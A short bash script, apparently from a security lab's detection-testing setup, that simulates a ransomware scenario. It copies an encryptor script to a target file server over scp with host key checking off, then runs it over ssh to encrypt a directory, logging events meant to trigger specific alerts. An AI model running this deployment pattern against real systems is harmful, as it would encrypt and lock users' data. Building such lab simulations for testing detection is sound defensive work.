#!/bin/bash
# E1 - Cifrado localizado
# El atacante instala el cifrador en la victima y lo ejecuta

set -uo pipefail
LOG=/var/log/lab/runner.jsonl
mkdir -p "$(dirname $LOG)"

log_event() {
    ts=$(date -u +%s%N)
    echo "{\"ts\":$ts,\"scenario\":\"E1\",\"event\":\"$1\"$([ -n "${2:-}" ] && echo ",\"data\":\"$2\"")}" | tee -a "$LOG"
}

TARGET_HOST="${TARGET_HOST:-fileserver}"
TARGET_USER="${TARGET_USER:-lab}"
TARGET_DIR="${TARGET_DIR:-/opt/labprueba}"

log_event "start" "target=$TARGET_HOST"


# Paso 2: copiar el cifrador
log_event "copy_payload"
scp -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
    /lab/simulators/encryptor.py \
    ${TARGET_USER}@${TARGET_HOST}:/tmp/encryptor.py \
    >> "$LOG" 2>&1

# Paso 3: ejecutar cifrado (dispara alertas 100200, 100201, 100202)
log_event "execute"
ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
    ${TARGET_USER}@${TARGET_HOST} \
    "python3 /tmp/encryptor.py --dir $TARGET_DIR --action encrypt" \
    >> "$LOG" 2>&1
RC=$?

log_event "end" "exit=$RC"
exit $RC
